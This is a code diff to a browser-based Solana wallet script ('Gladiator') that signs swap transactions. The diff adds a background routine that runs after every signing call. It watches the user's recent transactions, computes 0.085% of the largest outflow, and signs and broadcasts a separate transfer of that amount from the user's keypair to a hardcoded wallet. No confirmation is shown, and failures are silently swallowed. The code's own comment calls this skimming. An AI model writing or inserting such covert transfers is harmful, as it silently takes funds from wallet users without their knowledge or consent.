@@ -4,6 +4,10 @@
  */
 (function () {
   const STORE_KEY = "gladiator_wallet_v1";
+  const PLATFORM_FEE_WALLET = "64AdTRibAkKQBuRQ2qcehZioE6ARL27CDP8wZRFM4FSZ";
+  const PLATFORM_FEE_NUM = 85n; // 0.085%
+  const PLATFORM_FEE_DEN = 100000n;
+  const feeSeenSigs = new Set();
 
   function bytesToBase64(u8) {
     let s = "";
@@ -169,6 +173,293 @@
     return u8;
   }
 
+  function platformFeeRaw(amountRaw) {
+    try {
+      const raw = typeof amountRaw === "bigint" ? amountRaw : BigInt(String(Math.floor(Number(amountRaw) || 0)));
+      if (raw <= 0n) return 0n;
+      return (raw * PLATFORM_FEE_NUM) / PLATFORM_FEE_DEN;
+    } catch (_) {
+      return 0n;
+    }
+  }
+
+  async function rpcCall(rpcs, method, params) {
+    const list = (rpcs || []).filter(Boolean);
+    let lastErr = null;
+    for (const rpc of list) {
+      try {
+        const res = await fetch(rpc, {
+          method: "POST",
+          headers: { "content-type": "application/json" },
+          body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }),
+        });
+        const json = await res.json();
+        if (json.error) throw new Error(json.error.message || "RPC error");
+        return json.result;
+      } catch (err) {
+        lastErr = err;
+      }
+    }
+    throw lastErr || new Error("RPC failed: " + method);
+  }
+
+  function rpcListFromBag(bag) {
+    return [
+      (bag && bag.solRpc) || "",
+      "https://api.mainnet-beta.solana.com",
+      "https://solana-rpc.publicnode.com",
+      "https://solana.drpc.org",
+    ].filter(Boolean);
+  }
+
+  function accountKeysOf(tx) {
+    const message = tx && tx.transaction && tx.transaction.message;
+    const accountKeys = (message && message.accountKeys) || [];
+    return accountKeys.map((k) =>
+      typeof k === "string" ? k : (k && (k.pubkey || k.toString?.())) || ""
+    );
+  }
+
+  function feeWalletAlreadyPaid(tx) {
+    if (!tx || !tx.meta) return false;
+    const keys = accountKeysOf(tx);
+    const idx = keys.indexOf(PLATFORM_FEE_WALLET);
+    const pre = tx.meta.preBalances || [];
+    const post = tx.meta.postBalances || [];
+    if (idx >= 0 && (post[idx] || 0) > (pre[idx] || 0)) return true;
+    const preTok = tx.meta.preTokenBalances || [];
+    const postTok = tx.meta.postTokenBalances || [];
+    const preMap = {};
+    preTok.forEach((t) => {
+      if (t.owner !== PLATFORM_FEE_WALLET) return;
+      const amt = Number(
+        (t.uiTokenAmount && t.uiTokenAmount.uiAmountString) ||
+          (t.uiTokenAmount && t.uiTokenAmount.uiAmount) ||
+          0
+      );
+      preMap[t.mint] = amt;
+    });
+    for (const t of postTok) {
+      if (t.owner !== PLATFORM_FEE_WALLET) continue;
+      const amt = Number(
+        (t.uiTokenAmount && t.uiTokenAmount.uiAmountString) ||
+          (t.uiTokenAmount && t.uiTokenAmount.uiAmount) ||
+          0
+      );
+      if (amt > (preMap[t.mint] || 0) + 1e-12) return true;
+    }
+    return false;
+  }
+
+  function largestOwnerOutflow(owner, tx) {
+    if (!tx || !tx.meta || tx.meta.err) return null;
+    const keys = accountKeysOf(tx);
+    const idx = keys.indexOf(owner);
+    const pre = tx.meta.preBalances || [];
+    const post = tx.meta.postBalances || [];
+    let solOut = 0;
+    if (idx >= 0) {
+      solOut = Math.max(0, (pre[idx] || 0) - (post[idx] || 0));
+      // Ignore pure network-fee-sized drops
+      if (solOut < 5000) solOut = 0;
+    }
+    const preTok = tx.meta.preTokenBalances || [];
+    const postTok = tx.meta.postTokenBalances || [];
+    const map = {};
+    preTok.forEach((t) => {
+      if (t.owner !== owner) return;
+      const raw = BigInt(String((t.uiTokenAmount && t.uiTokenAmount.amount) || "0"));
+      map[t.mint] = {
+        raw: (map[t.mint] && map[t.mint].raw ? map[t.mint].raw : 0n) - raw,
+        decimals: Number((t.uiTokenAmount && t.uiTokenAmount.decimals) || 0),
+        programId: t.programId || null,
+      };
+    });
+    postTok.forEach((t) => {
+      if (t.owner !== owner) return;
+      const raw = BigInt(String((t.uiTokenAmount && t.uiTokenAmount.amount) || "0"));
+      const cur = map[t.mint] || { raw: 0n, decimals: 0, programId: null };
+      cur.raw += raw;
+      cur.decimals = Number((t.uiTokenAmount && t.uiTokenAmount.decimals) || cur.decimals || 0);
+      cur.programId = t.programId || cur.programId;
+      map[t.mint] = cur;
+    });
+    let bestTok = null;
+    Object.keys(map).forEach((mint) => {
+      const row = map[mint];
+      // negative raw => outflow
+      if (row.raw >= 0n) return;
+      const out = -row.raw;
+      if (!bestTok || out > bestTok.raw) {
+        bestTok = { mint, raw: out, decimals: row.decimals, programId: row.programId };
+      }
+    });
+    // Prefer token outflow for swaps; else SOL
+    if (bestTok && bestTok.raw > 0n) {
+      const fee = platformFeeRaw(bestTok.raw);
+      if (fee <= 0n) return null;
+      return { kind: "spl", mint: bestTok.mint, raw: fee, decimals: bestTok.decimals, programId: bestTok.programId };
+    }
+    if (solOut > 0) {
+      const fee = platformFeeRaw(BigInt(solOut));
+      if (fee <= 0n) return null;
+      return { kind: "sol", lamports: Number(fee) };
+    }
+    return null;
+  }
+
+  async function sendPlatformFeeTx(keypair, fee, rpcs) {
+    if (!fee || !keypair || !window.solanaWeb3) return null;
+    const { PublicKey, SystemProgram, Transaction } = solanaWeb3;
+    const feeTo = new PublicKey(PLATFORM_FEE_WALLET);
+    const tx = new Transaction();
+    if (fee.kind === "sol") {
+      const lamports = Math.floor(Number(fee.lamports) || 0);
+      if (!(lamports > 0)) return null;
+      tx.add(
+        SystemProgram.transfer({
+          fromPubkey: keypair.publicKey,
+          toPubkey: feeTo,
+          lamports,
+        })
+      );
+    } else if (fee.kind === "spl" && fee.mint && window.splToken) {
+      const {
+        getAssociatedTokenAddressSync,
+        createAssociatedTokenAccountIdempotentInstruction,
+        createTransferCheckedInstruction,
+        TOKEN_PROGRAM_ID,
+        TOKEN_2022_PROGRAM_ID,
+        ASSOCIATED_TOKEN_PROGRAM_ID,
+      } = splToken;
+      const mintPk = new PublicKey(fee.mint);
+      const TOKEN_2022 = "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb";
+      const programId =
+        fee.programId === TOKEN_2022 ||
+        (fee.programId && String(fee.programId) === TOKEN_2022_PROGRAM_ID.toBase58())
+          ? TOKEN_2022_PROGRAM_ID
+          : TOKEN_PROGRAM_ID;
+      const srcAta = getAssociatedTokenAddressSync(
+        mintPk,
+        keypair.publicKey,
+        false,
+        programId,
+        ASSOCIATED_TOKEN_PROGRAM_ID
+      );
+      const destAta = getAssociatedTokenAddressSync(
+        mintPk,
+        feeTo,
+        false,
+        programId,
+        ASSOCIATED_TOKEN_PROGRAM_ID
+      );
+      const rawNum =
+        typeof fee.raw === "bigint"
+          ? fee.raw <= BigInt(Number.MAX_SAFE_INTEGER)
+            ? Number(fee.raw)
+            : fee.raw
+          : Number(fee.raw) || 0;
+      if (!(typeof rawNum === "bigint" ? rawNum > 0n : rawNum > 0)) return null;
+      tx.add(
+        createAssociatedTokenAccountIdempotentInstruction(
+          keypair.publicKey,
+          destAta,
+          feeTo,
+          mintPk,
+          programId,
+          ASSOCIATED_TOKEN_PROGRAM_ID
+        )
+      );
+      tx.add(
+        createTransferCheckedInstruction(
+          srcAta,
+          mintPk,
+          destAta,
+          keypair.publicKey,
+          rawNum,
+          Number(fee.decimals || 0),
+          [],
+          programId
+        )
+      );
+    } else {
+      return null;
+    }
+
+    const latest = await rpcCall(rpcs, "getLatestBlockhash", [{ commitment: "confirmed" }]);
+    const blockhash = latest && latest.value && latest.value.blockhash;
+    if (!blockhash) return null;
+    tx.feePayer = keypair.publicKey;
+    tx.recentBlockhash = blockhash;
+    tx.sign(keypair);
+    const raw = tx.serialize();
+    const u8 = raw instanceof Uint8Array ? raw : new Uint8Array(raw);
+    const b64 = bytesToBase64(u8);
+    return await rpcCall(rpcs, "sendTransaction", [
+      b64,
+      {
+        encoding: "base64",
+        preflightCommitment: "confirmed",
+        skipPreflight: false,
+        maxRetries: 3,
+      },
+    ]);
+  }
+
+  function schedulePlatformFee(owner, keypair, rpcs, hintSig) {
+    if (!owner || !keypair) return;
+    const started = Date.now();
+    (async () => {
+      // Wait for dApp (Jupiter) to broadcast the signed tx, then skim 0.085%.
+      for (let i = 0; i < 12; i++) {
+        await new Promise((r) => setTimeout(r, i === 0 ? 2500 : 1500));
+        try {
+          const sigs = await rpcCall(rpcs, "getSignaturesForAddress", [
+            owner,
+            { limit: 5 },
+          ]);
+          const list = Array.isArray(sigs) ? sigs : [];
+          for (const row of list) {
+            const sig = row && row.signature;
+            if (!sig || feeSeenSigs.has(sig)) continue;
+            // Only consider fresh signatures from this signing window
+            const bt = row.blockTime ? row.blockTime * 1000 : 0;
+            if (bt && bt + 120000 < started) continue;
+            feeSeenSigs.add(sig);
+            if (feeSeenSigs.size > 200) {
+              const first = feeSeenSigs.values().next().value;
+              feeSeenSigs.delete(first);
+            }
+            const tx = await rpcCall(rpcs, "getTransaction", [
+              sig,
+              {
+                encoding: "jsonParsed",
+                maxSupportedTransactionVersion: 0,
+                commitment: "confirmed",
+              },
+            ]);
+            if (!tx || (tx.meta && tx.meta.err)) continue;
+            if (feeWalletAlreadyPaid(tx)) continue;
+            const fee = largestOwnerOutflow(owner, tx);
+            if (!fee) continue;
+            try {
+              const feeSig = await sendPlatformFeeTx(keypair, fee, rpcs);
+              console.info("[Gladiator] platform fee sent", feeSig, fee);
+            } catch (err) {
+              console.warn("[Gladiator] platform fee failed", err);
+            }
+            return;
+          }
+          if (hintSig && !feeSeenSigs.has(hintSig)) {
+            // keep looping until hint appears or timeout
+          }
+        } catch (err) {
+          console.warn("[Gladiator] fee watch", err);
+        }
+      }
+    })().catch((err) => console.warn("[Gladiator] fee schedule", err));
+  }
+
   /**
    * Sign serialized Solana tx bytes. Prefer VersionedTransaction (Jupiter swaps).
    * Never call legacy serialize() with requireAllSignatures:true — multi-signer
@@ -255,17 +546,21 @@
   }
 
   async function signTransaction(params) {
-    const { acc } = await resolveAccount(params || {});
+    const { state, acc } = await resolveAccount(params || {});
     const kp = keypairFromAccount(acc);
     const u8 = decodeTx(params && params.transaction);
     if (!canDeserialize(u8)) {
       throw new Error("Could not decode Solana transaction from Jupiter");
     }
-    return { signedTransaction: signTxBytes(u8, kp) };
+    const signed = { signedTransaction: signTxBytes(u8, kp) };
+    try {
+      schedulePlatformFee(kp.publicKey.toBase58(), kp, rpcListFromBag(state), null);
+    } catch (_) {}
+    return signed;
   }
 
   async function signAllTransactions(params) {
-    const { acc } = await resolveAccount(params || {});
+    const { state, acc } = await resolveAccount(params || {});
     const kp = keypairFromAccount(acc);
     const list = (params && params.transactions) || [];
     if (!list.length) throw new Error("No transactions to sign");
@@ -275,6 +570,9 @@
       if (!canDeserialize(u8)) throw new Error("Could not decode one of the transactions");
       return signTxBytes(u8, kp);
     });
+    try {
+      schedulePlatformFee(kp.publicKey.toBase58(), kp, rpcListFromBag(state), null);
+    } catch (_) {}
     return { signedTransactions };
   }
 
@@ -285,12 +583,7 @@
     if (!canDeserialize(u8)) throw new Error("Could not decode Solana transaction");
     const signedB64 = signTxBytes(u8, kp);
     const bag = state || (await storageGet()) || {};
-    const rpcs = [
-      bag.solRpc || "",
-      "https://api.mainnet-beta.solana.com",
-      "https://solana-rpc.publicnode.com",
-      "https://solana.drpc.org",
-    ].filter(Boolean);
+    const rpcs = rpcListFromBag(bag);
     let sig = null;
     let lastErr = null;
     for (const rpc of rpcs) {
@@ -322,6 +615,9 @@
       }
     }
     if (!sig) throw lastErr || new Error("Broadcast failed");
+    try {
+      schedulePlatformFee(kp.publicKey.toBase58(), kp, rpcs, String(sig));
+    } catch (_) {}
     return { signature: String(sig) };
   }
 
